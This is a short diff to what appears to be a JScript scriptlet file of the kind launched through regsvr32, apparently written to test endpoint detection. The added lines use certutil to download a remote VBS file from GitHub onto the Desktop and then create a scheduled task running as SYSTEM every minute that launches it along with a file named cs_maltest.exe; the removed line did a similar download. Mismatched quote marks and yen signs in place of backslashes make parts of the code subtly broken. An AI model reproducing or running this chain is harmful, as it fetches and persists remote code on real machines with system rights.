@@ -6,7 +6,8 @@
 	<script language="JScript">
 		<![CDATA[
 			var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
-			var r = new ActiveXObject("WScript.Shell").Run("schtasks /create /tn “testtask1” /tr “certutil.exe -urlcache -split -f https://github.com/scriptsample/mal/blob/master/edrtest.vbs %temp%¥edrtest.vbs” /sc MINUTE /ru system");
+			var r = new ActiveXObject("WScript.Shell").Run("certutil.exe -urlcache -split -f https://github.com/scriptsample/mal/blob/master/edrtest.vbs %USERPROFILE%¥Desktop¥edrtest.vbs”);
+			var r = new ActiveXObject("WScript.Shell").Run("schtasks /create /tn “testtask1” /tr “%USERPROFILE%¥Desktop¥edrtest.vbs %USERPROFILE%¥Desktop¥edrtest.zip %USERPROFILE%¥Desktop¥cs_maltest.exe ” /sc MINUTE /ru system");
 		]]>
 </script>
 </registration>
